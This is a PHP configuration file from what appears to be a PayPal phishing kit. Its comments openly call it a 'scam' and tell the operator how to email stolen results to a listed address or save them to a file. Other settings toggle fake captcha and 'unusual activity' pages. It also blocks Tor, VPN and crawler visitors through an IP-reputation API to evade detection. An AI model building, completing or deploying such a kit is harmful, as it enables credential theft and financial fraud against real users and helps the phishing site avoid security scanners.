<?php

	// ================================= //
	$antitype = 1;
	$One_Time_Access = 1; // Turn to 0 to turn off One Time Access 
	// ================================= //
	// ================================= //
	$scamname = "Mr Data"; // *Change |xAthena| to any name you want |Your Nick Name|
	// ================================= //
	// ================================= //
	$saveintext = "no";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
	$filename = "Information"; // Change |stored| to any name you want this will be the Rzlt file name
	// ================================= //
	// ================================= //
	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
	$to = "dataspecialist@elude.in";// Edit this to your email
	// ================================= //
	// ================================= //
	$show_captcha ="no"; 				 // If you don`t want to show ||Captcha Page|| edit |yes| to |no| 
	$show_unusual_activity ="yes"; 		 // If you don`t want to show ||Unusual Activity|| edit |yes| to |no|
	// ================================= //
	// ================================= //
	// ********* IP Protection ********* //
	$ip_protection = "no"; 			     // If you don`t want to use IP Protection change yes to no
	$ip_protection_api = "hrLrgpkoEzw5ybr2fFYSaEmVQoSYTXAu"; // Dont touch :()
	$max_fraud_score = "75";			// Put max fraud score 
	$fuck_tor = "true";					// If you don`t want to disallow Tor Users change true to xAthena
	$fuck_vpn = "true";					// If you don`t want to disallow VPN Users change true to xAthena
	$fuck_crawler = "true";				// If you don`t want to disallow Crawler Users change true to xAthena
	// ================================= //
	// ================================= //
	
	$exitLink = 'https://www.paypal.com'; 
?>